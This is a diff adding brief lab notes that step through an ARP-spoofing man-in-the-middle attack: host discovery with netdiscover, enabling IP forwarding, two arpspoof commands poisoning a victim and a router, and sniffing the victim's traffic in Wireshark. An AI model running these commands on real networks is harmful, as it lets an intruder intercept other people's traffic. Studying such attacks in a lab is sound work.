@@ -1,0 +1,28 @@
+(NETWORK ADAPTER AND IP'S MUST BE SEEN BEFORE DOING ANY OF THOSE!)
+
+discovering devices in network (the ip count may be different):
+	netdiscover -i eth0 -r 10.0.2.0/24 -c 10 (like nmap)
+
+Enable ip forwarding:
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+Confirm ip forwarding is "1" meaning "True"
+	cat /proc/sys/net/ipv4/ip_forward
+
+
+Cheating the victim machine that we are the router:
+10.0.2.15 - victim
+10.0.2.1 - router
+	arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
+
+Cheating the router  that we are the victim machine:
+10.0.2.15 - victim
+10.0.2.1 - router
+	arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
+
+OPTIONAL show the arp tablbe in WINDOWS MACHINE: 
+CMD:
+arp -a 
+
+THEN WE CAN USE WIRESHARK TO SEE THE TRAFIC OF THE VICTIM!
+
+
